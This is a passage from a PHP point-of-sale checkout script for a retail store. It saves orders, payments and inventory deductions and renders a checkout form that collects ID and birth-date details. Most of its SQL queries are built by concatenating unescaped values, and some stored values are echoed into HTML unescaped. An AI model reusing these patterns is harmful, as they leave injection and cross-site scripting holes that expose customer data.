              "orders_id" => $orderid,
              "products_id" => $productinfo['products_id'],
              "products_model" => $productinfo['products_model'],
              "products_name" => $productinfo['products_name'],
              "products_price" => $productprice,
              "final_price" => $productprice,
              "products_tax" => $taxrate,
              "products_discount" => $coupondiscount,
              "products_quantity" => $cartproduct[0],
              "products_location" => $productinfo['products_location'],
              "products_multisplit_parent_pid" => '',
            );
          }
          if ( !empty( $neworderproducts ) && !empty( $neworderproducts_multisplit ) ) { $neworderproducts = array_merge( $neworderproducts, $neworderproducts_multisplit ); }
          elseif ( empty( $neworderproducts ) && !empty( $neworderproducts_multisplit ) ) { $neworderproducts = $neworderproducts_multisplit; }

          for ( $i=0, $n=sizeof( $neworderproducts ); $i<$n; $i++ ) {
            $insertfields = "";
            $insertdata = "";
            foreach ( $neworderproducts[$i] as $key => $value ) {
              if ( $insertfields != '' ) { $insertfields .= ', '; }
              $insertfields .= $key;
              if ( $insertdata != '' ) { $insertdata .= ', '; }
              $value = str_replace( "'", "''", $value );
              if ( $value == 'NOW()' ) { $insertdata .= $value; }
              else { $insertdata .= "'" . $value . "'"; }
            }
            $insert_product = mysqli_query( $link, "INSERT INTO orders_products ( " . $insertfields . " ) VALUES ( " . $insertdata . " )" );
            $update_product = mysqli_query( $link, "UPDATE products SET products_quantity=products_quantity - " . (int)$neworderproducts[$i]['products_quantity'] . ", products_ordered=products_ordered + " . (int)$neworderproducts[$i]['products_quantity'] . " WHERE products_id='" . $neworderproducts[$i]['products_id'] . "'" );
            #$thisproducttax = $salestaxrate;
            #if ( $taxexempt == true || $productinfo['products_tax_class_id'] == 0 ) { $thisproducttax = 0; }
            $producttotals['subtotal'] += round( $neworderproducts[$i]['final_price'] * $neworderproducts[$i]['products_quantity'], 2 );
            #if ( $couponprice > 0 ) { $producttotals['tax'] += round( round( $couponprice * $neworderproducts[$i]['products_quantity'], 2 ) * $thisproducttax / 100, 2 ); }
            #else { $producttotals['tax'] += round( round( $neworderproducts[$i]['final_price'] * $neworderproducts[$i]['products_quantity'], 2 ) * $thisproducttax / 100, 2 ); }
            $producttotals['tax'] += round( round( ( $neworderproducts[$i]['final_price'] - $neworderproducts[$i]['products_discount'] ) * $neworderproducts[$i]['products_quantity'], 2 ) * $neworderproducts[$i]['products_tax'] / 100, 2 );

            $productquery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . $neworderproducts[$i]['products_id'] . "'" );
            $productinfo = mysqli_fetch_array( $productquery );
            $productthumb = '';
            if( $productinfo['products_image'] != '' ) { $productthumb = '<img src="http://cdn1.evike.com/images/' . $productinfo['products_image'] . '" width="80" />'; }
            $products_ordered_html .= '<tr><td>' . $productthumb . '</td><td>' . $neworderproducts[$i]['products_name'] .  '<br/><span style="color:#888;font-size:8pt;">PID: ' . $neworderproducts[$i]['products_id'] . '</span></td><td style="text-align:center;">' . $neworderproducts[$i]['products_quantity'] . '</td><td style="text-align:right;">$' . number_format( $neworderproducts[$i]['final_price'] * $neworderproducts[$i]['products_quantity'], 2 ) . '</td></tr>';

            # Deduct from products_location here (after deposco custover)
            $deductqty = $neworderproducts[$i]['products_quantity'];
            # Updated location logic starting 10/4/24
            if ( $deductqty > 0 && !in_array( $neworderproducts[$i]['products_id'], array( '72716', '78533', '113510' ) ) && $productinfo['products_service'] == 0 && $productinfo['products_non_shipped'] == 0 ) {
              $productlocationquery = mysqli_query( $link, "SELECT pl.* FROM products_locations pl WHERE pl.products_id='" . $neworderproducts[$i]['products_id'] . "' AND pl.location_id='Fishing 7000'" );
              $productlocationinfo = mysqli_fetch_array( $productlocationquery );
              if ( $productlocationinfo['location_id'] == 'Fishing 7000' ) {
                $update_qty = mysqli_query( $link, "UPDATE products_locations SET products_quantity=products_quantity - " . (int)$deductqty . " WHERE products_id='" . $productlocationinfo['products_id'] . "' AND location_id='" . $productlocationinfo['location_id'] . "'" );
              }
              else {
                $insert_qty = mysqli_query( $link, "INSERT INTO products_locations ( products_id, location_id, products_quantity ) VALUES ( '" . $neworderproducts[$i]['products_id'] . "', 'Fishing 7000', '-" . (int)$deductqty . "' )" );
              }
            }
            # Old logic
            /*
            #$productlocationquery = mysqli_query( $link, "SELECT pl.*, l.location_sequence FROM products_locations pl LEFT JOIN locations l ON pl.location_id=l.location_id WHERE pl.products_id='" . $neworderproducts[$i]['products_id'] . "' ORDER BY l.location_pickable DESC, l.location_sequence ASC" );
            #$productlocationquery = mysqli_query( $link, "SELECT pl.*, l.location_sequence FROM products_locations pl LEFT JOIN locations l ON pl.location_id=l.location_id WHERE pl.products_id='" . $neworderproducts[$i]['products_id'] . "' AND pl.location_pickable=1 ORDER BY l.location_sequence ASC" );
            $productlocationquery = mysqli_query( $link, "SELECT pl.*, l.location_sequence FROM products_locations pl LEFT JOIN locations l ON pl.location_id=l.location_id WHERE pl.products_id='" . $neworderproducts[$i]['products_id'] . "' AND ( pl.location_pickable=1 OR pl.location_id='Fishing 7000' OR pl.location_id='Store 6001' ) ORDER BY l.location_sequence ASC" );
            while ( $productlocationinfo = mysqli_fetch_array( $productlocationquery ) ) {
              if ( $deductqty > 0 && $productlocationinfo['products_quantity'] > 0 ) {
                if ( $deductqty <= $productlocationinfo['products_quantity'] ) {
                  $update_qty = mysqli_query( $link, "UPDATE products_locations SET products_quantity=products_quantity - " . (int)$deductqty . " WHERE products_id='" . $productlocationinfo['products_id'] . "' AND location_id='" . $productlocationinfo['location_id'] . "'" );
                  $deductqty = 0;
                }
                elseif ( $productlocationinfo['products_quantity'] > 0 ) {
                  $update_qty = mysqli_query( $link, "UPDATE products_locations SET products_quantity=0 WHERE products_id='" . $productlocationinfo['products_id'] . "' AND location_id='" . $productlocationinfo['location_id'] . "'" );
                  $deductqty = $deductqty - $productlocationinfo['products_quantity'];
                }
              }
            }
            if ( $deductqty > 0 && $productinfo['products_service'] == 0 && $productinfo['products_non_shipped'] == 0 && $productinfo['products_drop_shipped'] == 0 ) {
              $headers = "From: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0f6160227d6a7f63764f6a7966646a216c6062">[email&#160;protected]</a>\r\n";
              $inventory_deduct_subject = 'Alhambra store warehouse inventory deduction error - ' . $deductqty . 'x ' . $neworderproducts[$i]['products_id'] . ' - ' . date( "F j, Y g:ia" );
              $inventory_deduct_email = "Alhambra store warehouse inventory deduction error\n\n" . "PID: " . $neworderproducts[$i]['products_id'] . "\n" . "Quantity remaining to be deducted: " . $deductqty . "\n\n" . "Please verify stock in overstock locations and update the remaining quantity manually.\n";
              mail( '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="04656868616a4461726d6f612a676b69">[email&#160;protected]</a>,<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="066c67756968286a46656974762863706f6d632865696b">[email&#160;protected]</a>,<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5a2c33392e352874301a3935282a743f2c33313f74393537">[email&#160;protected]</a>', $inventory_deduct_subject, $inventory_deduct_email, $headers );
            }*/
          }
          #$producttotals['tax'] = round( ( $producttotals['subtotal'] - $producttotals['coupon'] ) * $salestaxrate / 100, 2 );
          $producttotals['subtotal'] = round( $producttotals['subtotal'] - $producttotals['coupon'], 2 );
          $producttotals['total'] = round( $producttotals['subtotal'] + $producttotals['tax'], 2 );
          $ordertotals['total'] = round( $ordertotals['subtotal'] + $ordertotals['tax'], 2 );
          if ( $producttotals['coupon'] > 0 ) {
            $insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', '" . $couponcode . " applied:', '-$" . number_format( $producttotals['coupon'], 2, '.', '' ) . "', '-" . number_format( $producttotals['coupon'], 2, '.', '' ) . "', 'ot_discount_coupon', '0' )" );
            $coupon_total = mysqli_query( $link, "INSERT INTO discount_coupons_to_orders ( coupons_id, orders_id ) VALUES ( '" . $couponcode . "', '" . $orderid . "' )" );
          }
          #$insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', 'Sub-Total:', '$" . number_format( $producttotals['subtotal'], 2, '.', '' ) . "', '" . number_format( $producttotals['subtotal'], 2, '.', '' ) . "', 'ot_subtotal', '1' )" );
          $insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', 'Sub-Total:', '$" . number_format( $ordertotals['subtotal'], 2, '.', '' ) . "', '" . number_format( $ordertotals['subtotal'], 2, '.', '' ) . "', 'ot_subtotal', '1' )" );
          $insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', 'In Store Pickup (Will Call):', '$0.00', '0', 'ot_shipping', '2' )" );
          #$insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', 'CA TAX:', '$" . number_format( $producttotals['tax'], 2, '.', '' ) . "', '" . number_format( $producttotals['tax'], 2, '.', '' ) . "', 'ot_tax', '3' )" );
          $insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', 'CA TAX:', '$" . number_format( $ordertotals['tax'], 2, '.', '' ) . "', '" . number_format( $ordertotals['tax'], 2, '.', '' ) . "', 'ot_tax', '3' )" );
          #$insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', 'Total:', '<b>$" . number_format( $producttotals['total'], 2, '.', '' ) . "</b>', '" . number_format( $producttotals['total'], 2, '.', '' ) . "', 'ot_total', '6' )" );
          $insert_total = mysqli_query( $link, "INSERT INTO orders_total ( orders_id, title, text, value, class, sort_order ) VALUES ( '" . $orderid . "', 'Total:', '<b>$" . number_format( $ordertotals['total'], 2, '.', '' ) . "</b>', '" . number_format( $ordertotals['total'], 2, '.', '' ) . "', 'ot_total', '6' )" );
          $savedpaymenttotal = 0;
          $savedpayments = array();
          foreach ( $cartpayments as $key => $cartpaymentdata ) {
            if ( $savedpaymenttotal >= $ordertotals['total'] && in_array( $cartpaymentdata, $savedpayments ) ) { continue; }
            $cartpayment = explode( ',', $cartpaymentdata );
            if ( preg_match( '/^Net /', $cartpayment[0] ) ) { continue; }
            $paymentnotes = $cartpayment[2];
            #$paymentnotes = str_replace( "'", "''", $paymentnotes );
            $paymentnotes = mysqli_real_escape_string( $link, $paymentnotes );
            $insert_payment = mysqli_query( $link, "INSERT INTO payments_store ( orders_id, payments_store_amount, payments_store_method, payments_store_notes, pos_users_id ) VALUES ( '" . $orderid . "', '" . number_format( $cartpayment['1'], 2, '.', '' ) . "', '" . $cartpayment[0] . "', '" . $paymentnotes . "', '" . $userinfo['pos_users_id'] . "' )" );
            if ( $paymentnotes != '' ) {
              #$ordernotes = "POS notes by " . $userinfo['pos_users_firstname'] . ' ' . $userinfo['pos_users_lastname'] . ":\n";
              $ordernotes = "";
              if ( $cartpayment[0] == 'Credit Card' ) { $ordernotes .= "Last 4 of Card Number: " . $paymentnotes; }
              if ( $cartpayment[0] == 'Store Credit' ) { $ordernotes .= "Store Credit Reason: " . $paymentnotes; }
              if ( $cartpayment[0] == 'Gift Card' ) { $ordernotes .= "Gift Card Number: " . $paymentnotes; }
              if ( $ordernotes != "" ) { $insert_notes = mysqli_query( $link, "INSERT INTO orders_notes ( orders_id, pos_users_id, orders_notes ) VALUES ( '" . $orderid . "', '" . $loginuser . "', '" . $ordernotes . "' )" ); }
            }
            $savedpaymenttotal += round( $cartpayment['1'], 2 );
            $savedpayments[] = $cartpaymentdata;
          }
          if ( $terms == true ) { $alertquery = mysqli_query( $link, "INSERT INTO orders_alerts ( orders_id, alert ) VALUES ( '" . $orderid . "', 'nopayment' )" ); }
          $action = 'order_complete';
          if ( $customerinfo['customers_id'] == $userinfo['customers_id'] || $customerinfo['customers_id'] == $employeepurchaseaccount || $customerinfo['customers_id'] == $drinkspurchaseaccount ) { $update_customer = mysqli_query( $link, "UPDATE customers SET customers_dob='0000-00-00 00:00:00', customers_dlid='', customers_leid='' WHERE customers_id='" . $userinfo['customers_id'] . "'" ); }
          unset( $_SESSION["customerid"] );
          unset( $_SESSION["dlid"] );
          unset( $_SESSION["leid"] );
          unset( $_SESSION["dob"] );
          unset( $_SESSION["newcustomerdata"] );
          unset( $_SESSION["cartproducts"] );
          unset( $_SESSION["customproducts"] );
          unset( $_SESSION["customprices"] );
          unset( $_SESSION["cartpayments"] );
          unset( $_SESSION["couponcode"] );
          unset( $_SESSION["ponumber"] );
          unset( $_SESSION["ordernotes"] );
          unset( $_SESSION["employeepurchase"] );

          // Send email confirmation
          $emailsent = false;
          if ( $customerinfo['customers_id'] != $userinfo['customers_id'] && $customerinfo['customers_id'] != $employeepurchaseaccount && $customerinfo['customers_id'] != $drinkspurchaseaccount ) {
            $email_subject = "Evike.com Superstore Order #" . $orderid . " Receipt";
            $email_order = "<b>Evike.com Superstore Order Receipt: #" . $orderid . "</b><br/><br/>";
            if ( $ponumber != '' ) { $email_order .= "<b>PO Number: " . $orderdata['orders_po_number'] . "</b><br/><br/>"; }
            if ( $customerinfo['entry_firstname'] != '' ) { $email_order .= "Hi " . $customerinfo['entry_firstname'] . ",\n\n"; }
            else { $email_order .= "Dear Customer,\n\n"; }
            $email_order .= "Below is your receipt for your recent transaction at the Evike.com Superstore.\n\n";
            if ( $products_ordered_html != '' )  {
              $email_order .= "<b>Order Details:</b>";
              $email_order .= '<table style="margin:15px 0;" border="0" cellpadding="2" cellspacing="2"><tr><th colspan="2"><b style="font-size:9pt;">PRODUCT</b></th><th><b style="font-size:9pt;">QTY</b></th><th><b style="font-size:9pt;">TOTAL</b></th></tr>' . $products_ordered_html;
              if ( $producttotals['coupon'] > 0 ) {
                if ( $couponcode != '' ) { $email_order .= '<tr><td colspan="2" style="text-align:right;">Coupon (' . $couponcode . ')</td><td colspan="2" style="text-align:right;">-$' . number_format( $producttotals['coupon'], 2, '.', '' ) . "</td></tr>"; }
                else { $email_order .= '<tr><td colspan="2" style="text-align:right;">Coupon</td><td colspan="2" style="text-align:right;">-$' . number_format( $producttotals['coupon'], 2, '.', '' ) . "</td></tr>"; }
              }
              $email_order .= '<tr><td colspan="2" style="text-align:right;">Subtotal</td><td colspan="2" style="text-align:right;">$' . number_format( $ordertotals['subtotal'], 2, '.', '' ) . "</td></tr>";
              $email_order .= '<tr><td colspan="2" style="text-align:right;">Tax</td><td colspan="2" style="text-align:right;">$' . number_format( $ordertotals['tax'], 2, '.', '' ) . "</td></tr>";
              $email_order .= '<tr><td colspan="2" style="text-align:right;"><b>Total</b></td><td colspan="2" style="text-align:right;"><b>$' . number_format( $ordertotals['total'], 2, '.', '' ) . "</b></td></tr>";
              $email_order .= '</table>' . "\n\n\n";
            }
            $email_order .= "If you have any questions or need assistance, please visit or contact the Evike.com Superstore at (626) 407-0561.\n\n";
            $email_order .= "Don't forget to also check out our vast selection of everything airsoft, fishing, and more online at our website <a href=\"https://www.evike.com/\">www.evike.com</a>!\n\n";
            $email_order .= "Thank you for shopping with us,\n\n";
            $email_order .= "Evike.com Superstore\n\n";
            $htmlbody = str_replace( "\n", '<br/>', $email_order );
            if ( sendhtmlemail( $orderdata['customers_email_address'], $email_subject, $htmlbody, 'Evike.com Superstore', '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="244a4b09564154485d6441524d4f410a474b49">[email&#160;protected]</a>' ) ) { $emailsent = true; }
            #sendhtmlemail( '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="056e706b6c4560736c6e602b666a68">[email&#160;protected]</a>', $email_subject, $htmlbody, 'Evike.com Superstore', '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="315f5e1c4354415d48715447585a541f525e5c">[email&#160;protected]</a>' );
          }
        }
        else { $action == ''; $msg .= 'Error saving order, please confirm all information and try again.'; }
      }
      else { $action == ''; $msg .= 'Insufficient information to save order, please confirm all information and try again.'; }
    }
    if ( $action == 'order_complete' && $orderid > 0 ) {
?>
   <h1>Order Complete</h1>
   <div>
    <div class="completecontent">
     <h2>Order Number: <?php echo $orderid; ?></h2>
     <?php if ( $emailsent == true ) { echo '<h3>Receipt has been e-mailed to customer.</h3>'; } ?>
     <button onclick="window.open('/store/index.php?action=print_receipt&orderid=<?php echo $orderid; ?>');return false;">View/Print Receipt</button>
     <?php /* if ( $customerinfo['customers_email_address'] != '' && strpos( $customerinfo['customers_email_address'], 'evike.com' ) === false ) { echo '<button onclick="location.href=\'/store/index.php?action=email_receipt&orderid=' . $orderid . '\');return false;">E-mail Receipt to Customer</button>'; } */ ?>
    </div>
   </div>
<?php
    }
    else {
      if ( $action == 'order_complete' ) { $msg .= 'Error saving order. Please confirm all information and try again.'; }
?>
   <!--<button type="button" class="clearorder" onclick="if(confirm('Clear order?')){location.href='/store/index.php?action=clear_checkout';return false;}else{return false;}">Clear Order</button>
   <h1>Checkout</h1>-->
   <div>
    <form action="/store/index.php" method="post" id="checkoutform" onsubmit="addButton.disabled=true;saveButton.disabled=true;return true;">
     <input type="hidden" name="action" value="submit_checkout" />
     <div class="contentbox">
      <div class="col1" style="margin-bottom:0;">
       <h2 style="margin-bottom:5px;font-size:14px;"><b>Checkout</b> - Selected Customer Account</h2>
<?php
      $requiredisclaimer = false;
      $requireleid = false;
      foreach ( $cartproducts as $key => $cartproductdata ) {
        if ( $requiredisclaimer == true && $requireleid == true ) { continue; }
        $cartproduct = explode( ',', $cartproductdata );
        if ( $cartproduct[0] < 1 ) { continue; }
        if ( !preg_match( '/^\d{5,6}$/', $cartproduct[1] ) ) { continue; }
        $productquery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . $cartproduct[1] . "'" );
        $productinfo = mysqli_fetch_array( $productquery );
        if ( $productinfo['products_lawenforcement'] == 1 ) { $requireleid = true; }
        if ( $productinfo['products_multisplit'] != '' ) {
          $multisplit_lines = explode( "\n", $productinfo['products_multisplit'] );
          foreach ( $multisplit_lines as $multisplit_line ) {
            $multisplit_productdata = explode( ',', $multisplit_line );
            $multisplit_product = trim( $multisplit_productdata[0] );
            $multisplit_productquery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . $multisplit_product . "'" );
            $multisplit_productinfo = mysqli_fetch_array( $multisplit_productquery );
            if ( $multisplit_productinfo['products_lawenforcement'] == 1 ) { $requireleid = true; }
            if ( $requiredisclaimer == false ) {
              $productcatquery = mysqli_query( $link, "SELECT categories_id FROM products_to_categories WHERE products_id='" . $multisplit_product . "'" );
              while ( $productcatinfo = mysqli_fetch_array( $productcatquery ) ) { if ( in_array( $productcatinfo['categories_id'], $disclaimercats ) && !in_array( $multisplit_product, $disclaimerexclusionproducts ) ) { $requiredisclaimer = true; } }
            }
          }
        }
        if ( $requiredisclaimer == false ) {
          $productcatquery = mysqli_query( $link, "SELECT categories_id FROM products_to_categories WHERE products_id='" . $cartproduct[1] . "'" );
          while ( $productcatinfo = mysqli_fetch_array( $productcatquery ) ) { if ( in_array( $productcatinfo['categories_id'], $disclaimercats ) && !in_array( $cartproduct[1], $disclaimerexclusionproducts ) ) { $requiredisclaimer = true; } }
        }
      }
      if ( $newcustomer == true ) {
        echo '<h4 style="margin-bottom:0;margin-right:20px;float:left;">' . $newcustomerdata['customers_firstname'] . ' ' . $newcustomerdata['customers_lastname'] . '</h4>';
        echo '<h4 style="margin-bottom:0;margin-right:20px;float:left;">' . $newcustomerdata['customers_email_address'] . '</h4><h4 style="margin-bottom:0;float:left;">' . $newcustomerdata['customers_telephone'] . '</h4>';
      }
      else {
        if ( $customerid == '' || $customerid == 0 ) { $customerid = $userinfo['customers_id']; $_SESSION["customerid"] = $customerid; }
        $customerquery = mysqli_query( $link, "SELECT * FROM customers WHERE customers_id='" . $customerid . "'" );
        $customerinfo = mysqli_fetch_array( $customerquery );
        echo '<h4 style="margin-bottom:0;margin-right:20px;float:left;">' . $customerinfo['customers_firstname'] . ' ' . $customerinfo['customers_lastname'] . '</h4>';
        echo '<h4 style="margin-bottom:0;margin-right:20px;float:left;">' . $customerinfo['customers_email_address'] . '</h4><h4 style="margin-bottom:0;float:left;">' . $customerinfo['customers_telephone'] . '</h4>';
        if ( $customerinfo['customers_notes_pos'] != '' ) { echo '<div style="clear:both;"><h4 style="color:red;"><b>Note:</b> ' . $customerinfo['customers_notes_pos'] . '</h4></div>'; }
      }
      if ( $requiredisclaimer == true ) {
        echo '<br/>';
        if ( $newcustomer == true ) {
          if ( $newcustomerdata['customers_dlid'] != '' ) {
            $dobtext = ''; if ( $newcustomerdata['customers_dob'] != '' ) { $dobtext = ' (' . $newcustomerdata['customers_dob'] . ')'; }
            echo '<h4 style="color:green;">Driver\'s License/ID: <b>' . $newcustomerdata['customers_dlid'] . '</b> ' . $dobtext . '<span onclick="$(\'#changedlid\').show();">Change</span></h4>';
            echo '<div id="changedlid" style="display:none;"><input type="text" name="changedlid" id="changedlidfield" value="" placeholder="Driver\'s license/ID" /><input type="tel" name="changedob" id="changedobfield" value="" placeholder="DOB: YYYY-MM-DD" pattern="\d{4}-\d{2}-\d{2}" />';
            echo '<button type="button" onclick="$(\'#changedlid\').hide();$(\'#changedlidfield\').val(\'\');$(\'#changedobfield\').val(\'\');return false;">Cancel</button><button type="submit" id="changedlidbutton">Save</button></div>';
            $dlid = $newcustomerdata['customers_dlid'];
          }
          else {
            echo '<h4 style="color:red;">Driver\'s License/ID required for waiver</h4>';
            echo '<div id="changedlid"><input type="text" name="changedlid" value="" placeholder="Driver\'s license/ID" /><input type="tel" name="changedob" value="" placeholder="DOB: YYYY-MM-DD" pattern="\d{4}-\d{2}-\d{2}" /><button type="submit" id="changedlidbutton">Save</button></div>';
          }
        }
        else {
          #if ( $customerinfo['customers_id'] == $userinfo['customers_id'] ) { echo '<h4 style="color:red;">Customer account required for waiver - locate or create new customer account below</h4>'; }
          if ( $dlid != '' || $customerinfo['customers_dlid'] != '' ) {
            if ( $dlid == '' ) { $dlid = $customerinfo['customers_dlid']; }
            if ( $dob == '' ) { $dob = $customerinfo['customers_dob']; $dob = substr( $dob, 0, 10 ); if ( $dob == '0000-00-00' ) { $dob = ''; } }
            $dobtext = ''; if ( $dob != '' ) { $dobtext = ' (' . $dob . ')'; }
            echo '<h4 style="color:green;">Driver\'s License/ID: <b>' . $dlid . '</b> ' . $dobtext . '<span onclick="$(\'#changedlid\').show();">Change</span></h4>';
            echo '<div id="changedlid" style="display:none;"><input type="text" name="dlid" id="changedlidfield" value="" placeholder="Driver\'s license/ID" /><input type="tel" name="dob" id="changedobfield" value="" placeholder="DOB: YYYY-MM-DD" pattern="\d{4}-\d{2}-\d{2}" />';
            echo '<button type="button" onclick="$(\'#changedlid\').hide();$(\'#changedlidfield\').val(\'\');$(\'#changedobfield\').val(\'\');return false;">Cancel</button><button type="submit" id="changedlidbutton">Save</button></div>';
          }
          else {
            echo '<h4 style="color:red;">Driver\'s License/ID required for waiver</h4>';
            echo '<div id="changedlid"><input type="text" name="dlid" value="" placeholder="Driver\'s license/ID" /><input type="tel" name="dob" value="" placeholder="DOB: YYYY-MM-DD" pattern="\d{4}-\d{2}-\d{2}" /><button type="submit" id="changedlidbutton">Save</button></div>';
          }
        }
      }
      if ( $requireleid == true ) {
        if ( $newcustomer == true ) {
          if ( $newcustomerdata['customers_leid'] != '' ) {
            echo '<h4 style="color:blue;">Law Enforcement/Military ID: <b>' . $newcustomerdata['customers_leid'] . '</b> <span onclick="$(\'#changeleid\').show();">Change</span></h4>';
            echo '<div id="changeleid" style="display:none;"><input type="text" name="changeleid" id="changeleidfield" value="" placeholder="Law Enforcement/Military ID" />';
            echo '<button type="button" onclick="$(\'#changeleid\').hide();$(\'#changeleidfield\').val(\'\');return false;">Cancel</button><button type="submit" id="changeleidbutton">Save</button></div>';
            $leid = $newcustomerdata['customers_leid'];
          }
          else {
            echo '<h4 style="color:red;">Law Enforcement/Military ID required for purchase</h4>';
            echo '<div id="changeleid"><input type="text" name="changeleid" value="" placeholder="Law Enforcement/Military ID" /><button type="submit" id="changeleidbutton">Save</button></div>';
          }
        }
        else {
          if ( $leid != '' || $customerinfo['customers_leid'] != '' ) {
            if ( $leid == '' ) { $leid = $customerinfo['customers_leid']; }
            echo '<h4 style="color:blue;">Law Enforcement/Military ID: <b>' . $leid . '</b> ' . $dobtext . '<span onclick="$(\'#changeleid\').show();">Change</span></h4>';
            echo '<div id="changeleid" style="display:none;"><input type="text" name="leid" id="changeleidfield" value="" placeholder="Law Enforcement/Military /ID" />';
            echo '<button type="button" onclick="$(\'#changeleid\').hide();$(\'#changeleidfield\').val(\'\');return false;">Cancel</button><button type="submit" id="changeleidbutton">Save</button></div>';
          }
          else {
            echo '<h4 style="color:red;">Law Enforcement/Military ID required for purchase</h4>';
            echo '<div id="changeleid"><input type="text" name="leid" value="" placeholder="Law Enforcement/Military ID" /><button type="submit" id="changeleidbutton">Save</button></div>';
          }
        }
      }
      if ( $_SESSION["customerid"] == $employeepurchaseaccount || $_SESSION["customerid"] == $drinkspurchaseaccount ) {
        if ( $_SESSION['employeepurchase'] == '' ) { echo '<h4 style="color:red;">Full employee name required for purchase</h4>'; }
        else { echo '<h4 style="color:black;">Full employee name required for purchase</h4>'; }
        echo '<div id="changeleid"><input type="text" name="employeepurchase" value="' . $_SESSION['employeepurchase'] . '" placeholder="Employee Name" /></div>';
      }
      elseif ( $_SESSION["customerid"] == 1194423 || $_SESSION["customerid"] == 1200305 ) { # <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="384c515d4a0a4c5940785d4e51535d165b5755">[email&#160;protected]</a>, <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d3a7bab6a1e0a7b2ab93b6a5bab8b6fdb0bcbe">[email&#160;protected]</a>
        if ( $_SESSION['employeepurchase'] == '' ) { echo '<h4 style="color:red;">Full customer name/company required for purchase</h4>'; }
        else { echo '<h4 style="color:black;">Full customer name/company required for purchase</h4>'; }
        echo '<div id="changeleid"><input type="text" name="employeepurchase" value="' . $_SESSION['employeepurchase'] . '" placeholder="Full Customer Name/Company" /></div>';
      }
      if ( $customerselection != '' ) {
        echo '</div><div class="spacer"></div>';
        echo '<div id="selectcustomer">';
        echo '<h2>Select New Customer Account</h2>';
        echo '<table class="customerselect">';
        echo $customerselection;
        echo '</table>';
        echo '<button>Change to Selected Customer</button>';
        echo '<button type="button" id="cancelbutton" onclick="$(\'#cancelbutton\').hide();$(\'#selectcustomer\').hide();$(\'#changecustomerbutton\').show();$(\'.customeridselectradio\').prop(\'checked\', false);return false;">Cancel</button>';
        echo '</div>';
        echo '<button type="submit" id="changecustomerbutton" style="display:none;">Change Customer</button>';
      }
      else {
?>
      </div>
      <div class="col2" style="margin-bottom:0;text-align:right;">
       <button type="button" id="changecustomerbutton" onclick="$('#changecustomerbutton').hide();$('#newcustomerbutton').hide();$('#changecustomer').show();return false;">Change Customer</button>
       <button type="button" id="newcustomerbutton" onclick="$('#changecustomerbutton').hide();$('#newcustomerbutton').hide();$('#newcustomer').show();return false;">+ New Customer</button>
      </div>
      <div class="spacer"></div>
      <div id="changecustomer">
       <h2>Change Customer Account</h2>
       <table class="customersearch">
        <tr><td>Look up customer by email address</td><td><input type="email" name="email" id="emailfield" value="" placeholder="Email address" style="width:300px;" /></td></tr>
        <tr><td>Look up customer by phone number</td><td><input type="tel" name="phone" id="phonefield" value="" placeholder="Phone Number" style="width:150px;" /></td></tr>
       </table>
       <button>Search</button>
       <button type="button" onclick="$('#changecustomerbutton').show();$('#newcustomerbutton').show();$('#changecustomer').hide();$('#emailfield').val('');$('#phonefield').val('');return false;">Cancel</button>
      </div>
      <div id="newcustomer">
       <h2>New Customer Account</h2>
       <table class="customersearch">
        <tr><td>First Name</td><td><input type="text" name="newfirstname" id="newfirstnamefield" value="" placeholder="First name" style="width:300px;" /></td></tr>
        <tr><td>Last Name</td><td><input type="text" name="newlastname" id="newlastnamefield" value="" placeholder="Last name" style="width:300px;" /></td></tr>
        <tr><td>Email address</td><td><input type="email" name="newemail" id="newemailfield" value="" placeholder="Email address" style="width:300px;" /></td></tr>
        <tr><td>Phone number</td><td><input type="tel" name="newphone" id="newphonefield" value="" placeholder="Phone number" style="width:150px;" /></td></tr>
        <tr><td>Driver's License/ID</td><td><input type="text" name="newdlid" id="newdlidfield" value="" placeholder="Driver's license/ID" style="width:150px;" /></td></tr>
        <tr><td>Date of Birth</td><td><input type="date" name="newdob" id="newdobfield" value="" placeholder="YYYY-MM-DD" pattern="\d{4}-\d{2}-\d{2}" style="width:150px;" /></td></tr>
       </table>
       <button>Save</button>
       <button type="button" onclick="$('#changecustomerbutton').show();$('#newcustomerbutton').show();$('#newcustomer').hide();$('#newfirstnamefield').val('');$('#newlastnamefield').val('');$('#newemailfield').val('');$('#newphonefield').val('');$('#newdlidfield').val('');$('#newdobfield').val('');return false;">Cancel</button>
      </div>
<?php
      }
?>
     </div>
     <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
     <button type="button" class="clearorder" onclick="if(confirm('Clear order?')){location.href='/store/index.php?action=clear_checkout';return false;}else{return false;}" style="margin:40px 0 0 0;">Clear Order</button>
     <table class="checkoutadd">
      <tr><th>Qty</th><th>Scan/Enter Barcode/PID</th><th></th></tr>
      <tr>
       <td><input class="qty" type="tel" name="quantity" id="qtyfield" value="1" onblur="this.value=this.value.replace(/[^0-9]/g,'');" /></td>
       <td><input class="barcode" type="tel" name="barcode" id="barcodefield" value="" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9a-zA-Z-_]/g,'');" /></td>
       <td><button name="addButton">+</button></td>
      </tr>
     </table>

